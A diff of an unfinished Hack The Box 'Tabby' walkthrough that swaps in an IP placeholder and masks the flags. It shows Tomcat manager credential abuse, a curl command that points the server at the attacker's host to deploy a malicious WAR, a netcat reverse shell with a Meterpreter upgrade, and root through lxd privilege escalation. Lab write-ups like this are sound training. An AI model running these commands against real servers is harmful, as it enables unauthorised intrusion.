@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Tabby
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-tabby-infocard.png)
-
 Short description to include any strange things to be dealt with
 
 TODO: Finish writeup and clean up
@@ -31,11 +29,11 @@ TODO: Finish writeup and clean up
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.194`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/tabby]
-└─$ sudo nmap -sSCV -p- -n -v -oA tabby 10.10.10.194
+└─$ sudo nmap -sSCV -p- -n -v -oA tabby <YOUR_IP>
 [sudo] password for zweilos: 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 13:08 EDT
 NSE: Loaded 151 scripts for scanning.
@@ -47,26 +45,26 @@ Completed NSE at 13:08, 0.00s elapsed
 Initiating NSE at 13:08
 Completed NSE at 13:08, 0.00s elapsed
 Initiating Ping Scan at 13:08
-Scanning 10.10.10.194 [4 ports]
+Scanning <YOUR_IP> [4 ports]
 Completed Ping Scan at 13:08, 0.11s elapsed (1 total hosts)
 Initiating SYN Stealth Scan at 13:08
-Scanning 10.10.10.194 [65535 ports]
-Discovered open port 22/tcp on 10.10.10.194
-Discovered open port 8080/tcp on 10.10.10.194
-Discovered open port 80/tcp on 10.10.10.194
+Scanning <YOUR_IP> [65535 ports]
+Discovered open port 22/tcp on <YOUR_IP>
+Discovered open port 8080/tcp on <YOUR_IP>
+Discovered open port 80/tcp on <YOUR_IP>
 SYN Stealth Scan Timing: About 38.44% done; ETC: 13:10 (0:00:50 remaining)
 Completed SYN Stealth Scan at 13:09, 77.94s elapsed (65535 total ports)
 Initiating Service scan at 13:09
-Scanning 3 services on 10.10.10.194
+Scanning 3 services on <YOUR_IP>
 Completed Service scan at 13:10, 6.08s elapsed (3 services on 1 host)
-NSE: Script scanning 10.10.10.194.
+NSE: Script scanning <YOUR_IP>.
 Initiating NSE at 13:10
 Completed NSE at 13:10, 1.79s elapsed
 Initiating NSE at 13:10
 Completed NSE at 13:10, 0.23s elapsed
 Initiating NSE at 13:10
 Completed NSE at 13:10, 0.00s elapsed
-Nmap scan report for 10.10.10.194
+Nmap scan report for <YOUR_IP>
 Host is up (0.050s latency).
 Not shown: 65532 closed ports
 PORT     STATE SERVICE VERSION
@@ -122,7 +120,7 @@ When I navigated to port 8080 I was greeted by a basic authentication prompt tha
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-8080-manager-unauth.png)
 
-Putting in bad credentials redirected me to a very verbose 401 Unauthorized page.  [http://10.10.10.194:8080/docs/host-manager-howto.html](http://10.10.10.194:8080/docs/host-manager-howto.html)
+Putting in bad credentials redirected me to a very verbose 401 Unauthorized page.  [http://<YOUR_IP>:8080/docs/host-manager-howto.html](http://<YOUR_IP>:8080/docs/host-manager-howto.html)
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-tomcat-users%2520%25281%2529.png)
 
@@ -133,8 +131,6 @@ Putting in bad credentials redirected me to a very verbose 401 Unauthorized page
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-server-information%2520%25281%2529.png)
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-tomcat-manager.png)
-
-
 
 how to use curl to send package to server
 
@@ -196,7 +192,7 @@ started my handler in msfconsole
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/tabby]
-└─$ curl -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/host-manager/html/add?name=test&aliases=test&appBase=http://10.10.14.216:8099/CRash.war&deployOnStartup=true"
+└─$ curl -u 'tomcat:$3cureP4s5w0rd123!' "http://<YOUR_IP>:8080/host-manager/html/add?name=test&aliases=test&appBase=http://10.10.14.216:8099/CRash.war&deployOnStartup=true"
 <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
 <html>
  <head>
@@ -223,7 +219,7 @@ started my handler in msfconsole
 
 upload did not work as in the Windows example, kept reading in the documentation, and found a way to deploy directly, without adding first
 
-[http://10.10.10.194:8080/docs/manager-howto.html\#Deploy\_A\_New\_Application\_Archive\_\(WAR\)\_Remotely](http://10.10.10.194:8080/docs/manager-howto.html#Deploy_A_New_Application_Archive_%28WAR%29_Remotely)
+[http://<YOUR_IP>:8080/docs/manager-howto.html\#Deploy\_A\_New\_Application\_Archive\_\(WAR\)\_Remotely](http://<YOUR_IP>:8080/docs/manager-howto.html#Deploy_A_New_Application_Archive_%28WAR%29_Remotely)
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7-manager-deploy.png)
 
@@ -261,7 +257,7 @@ next I uploaded the new version \(had to change the name since the old one still
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/tabby]
-└─$ curl http://10.10.10.194:8080/CRash2/
+└─$ curl http://<YOUR_IP>:8080/CRash2/
 ```
 
 Then I activated my reverse shell by curling the  
@@ -274,7 +270,7 @@ Then I activated my reverse shell by curling the
 ┌──(zweilos㉿kali)-[~/htb/tabby]
 └─$ nc -lvnp 12543
 listening on [any] 12543 ...
-connect to [10.10.14.216] from (UNKNOWN) [10.10.10.194] 53772
+connect to [10.10.14.216] from (UNKNOWN) [<YOUR_IP>] 53772
 which python
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 tomcat@tabby:/var/lib/tomcat9$ ^Z
@@ -293,7 +289,7 @@ I got a shell back on my nc listener, and attempted to upgrade my shell using py
 
 ```text
 [*] Started reverse TCP handler on 10.10.14.216:12543 
-[*] Command shell session 1 opened (10.10.14.216:12543 -> 10.10.10.194:53774) at 2020-10-12 15:00:22 -0400
+[*] Command shell session 1 opened (10.10.14.216:12543 -> <YOUR_IP>:53774) at 2020-10-12 15:00:22 -0400
 
 ^Z
 Background session 1? [y/N]  y
@@ -303,8 +299,8 @@ msf5 exploit(multi/handler) > sessions -u 1
 [*] Upgrading session ID: 1
 [*] Starting exploit/multi/handler
 [*] Started reverse TCP handler on 10.10.14.216:4433 
-[*] Sending stage (980808 bytes) to 10.10.10.194
-[*] Meterpreter session 2 opened (10.10.14.216:4433 -> 10.10.10.194:47896) at 2020-10-12 15:00:45 -0400
+[*] Sending stage (980808 bytes) to <YOUR_IP>
+[*] Meterpreter session 2 opened (10.10.14.216:4433 -> <YOUR_IP>:47896) at 2020-10-12 15:00:45 -0400
 [*] Command stager progress: 100.00% (773/773 bytes)
 msf5 exploit(multi/handler) > 
 [*] Stopping exploit/multi/handler
@@ -372,7 +368,7 @@ shsjks
 ```text
 zweilos@kali:~/htb/tabby$ nc -lvnp 12543
 listening on [any] 12543 ...
-connect to [10.10.14.216] from (UNKNOWN) [10.10.10.194] 53782
+connect to [10.10.14.216] from (UNKNOWN) [<YOUR_IP>] 53782
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 tomcat@tabby:/var/lib/tomcat9$ ^Z
 [1]+  Stopped                 nc -lvnp 12543
@@ -505,8 +501,6 @@ Archive:  16162020_backup.zip
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/9-zip.png)
 
-
-
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-digitallandscape.png)
 
 The `index.php` file seems nearly identical to the one currently hosted...except for the email address sales@digitallandscape.com and other references to the name Digital Landscapes. It seems like the company did some rebranding recently.
@@ -533,7 +527,7 @@ drwxr-xr-x 3 ash  ash     4096 Oct 12 19:56 snap
 -rw-r----- 1 ash  ash        0 May 19 11:48 .sudo_as_admin_successful
 -rw-r----- 1 ash  ash       33 Oct 12 19:54 user.txt
 ash@tabby:~$ cat user.txt 
-e33e9ee57fa4cba7975b70a784092efa
+****
 ```
 
 The zip file seemed to be a dead-end, so I decided to try to use the password I had found on the only user I knew, `ash`, and was able to `su` over to that user!
@@ -596,7 +590,7 @@ ash@tabby:/dev/shm$ ip a
        valid_lft forever preferred_lft forever
 2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
     link/ether 00:50:56:b9:0e:0a brd ff:ff:ff:ff:ff:ff
-    inet 10.10.10.194/24 brd 10.10.10.255 scope global ens192
+    inet <YOUR_IP>/24 brd <YOUR_IP> scope global ens192
        valid_lft forever preferred_lft forever
 3: lxdbr0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UNKNOWN group default qlen 1000
     link/ether d6:e6:3d:b8:e9:eb brd ff:ff:ff:ff:ff:ff
@@ -652,13 +646,13 @@ bin    etc    lib    mnt    proc   run    srv    tmp    var
 dev    home   media  opt    root   sbin   sys    usr
 / # cd root
 ~ # ls
-~ # ssh root@10.10.10.194
+~ # ssh root@<YOUR_IP>
 ash: ssh: not found
 ~ # cd /mnt/root/root
 /mnt/root/root # ls
 root.txt  snap
 /mnt/root/root # cat root.txt 
-2d8c7388853dadce25e4605460167ab1
+****
 ```
 
 Even though I had the root flag, I was not convinced that I had actually owned the machine,
@@ -689,7 +683,7 @@ so I tried to add my public key and ssh in
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/tabby]
-└─$ ssh -i ash.key root@10.10.10.194        
+└─$ ssh -i ash.key root@<YOUR_IP>        
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-31-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -704,21 +698,18 @@ Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-31-generic x86_64)
   Swap usage:              0%
   Processes:               229
   Users logged in:         1
-  IPv4 address for ens192: 10.10.10.194
+  IPv4 address for ens192: <YOUR_IP>
   IPv4 address for liquid: 10.84.102.1
   IPv6 address for liquid: fd42:cd51:1c76:426c::1
   IPv4 address for lxdbr0: 10.192.134.1
   IPv6 address for lxdbr0: fd42:a03c:fcd2:592f::1
 
-
 0 updates can be installed immediately.
 0 of these updates are security updates.
-
 
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
 
 Last login: Wed Jun 17 21:58:30 2020 from 10.10.14.2
 root@tabby:~# id && hostname
@@ -729,7 +720,3 @@ tabby
 now I was happy and satisfied that I had truly owned the machine. I was still not entirely happy with how easy the root privesc was, but it was a good learning experience to know to secure members of the `lxd` group!
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/tabby-pwn.png)
-
-Thanks to [`egre55`](https://app.hackthebox.eu/users/1190) for something interesting or useful about this machine.
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
